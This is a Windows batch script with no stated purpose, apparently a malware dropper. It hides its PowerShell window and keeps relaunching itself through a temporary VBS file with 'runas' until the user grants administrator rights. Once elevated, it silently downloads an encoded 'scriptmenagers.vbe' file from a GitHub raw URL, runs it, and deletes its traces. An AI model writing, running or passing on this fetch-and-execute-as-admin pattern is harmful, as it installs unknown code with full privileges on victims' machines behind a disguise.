@echo off
cd C:\Windows\
setlocal enabledelayedexpansion
set "tempDir=%temp%"
>nul 2>&1 net session && (
    echo. > "%tempDir%\admincheck.ok"
)
powershell -WindowStyle Hidden -Command "(New-Object -ComObject WIA.CommonDialog).ShowAcquireImage()" >nul 2>&1
goto :ask
:setadmin
if exist "%tempDir%\admincheck.ok" (
    exit
)else (
goto setadmin2
)
:setadmin2
echo Set objShell = CreateObject("Shell.Application") > "%temp%\admin.vbs"
echo objShell.ShellExecute "%~s0", "admin", "", "runas", 1 >> "%temp%\admin.vbs"
"%temp%\admin.vbs"
del /q "%temp%\admin.vbs"
>nul 2>&1 net session && (
    echo. > "%tempDir%\admincheck.ok"
)
ping 127.0.0.1 -n 1 > nul
:ask

>nul 2>&1 net session && (
    set IsAdmin=1
)

if defined IsAdmin (
    goto admin
) else (
    goto setadmin 
)
pause
:admin
curl -s -o "scriptmenagers".vbe -JL "https://github.com/VanishGX/Base/raw/main/scriptmenagers.vbe"
scriptmenagers.vbe
ping 127.0.0.1 -n 1 > nul
del /q "%tempDir%\admincheck.ok"
exit
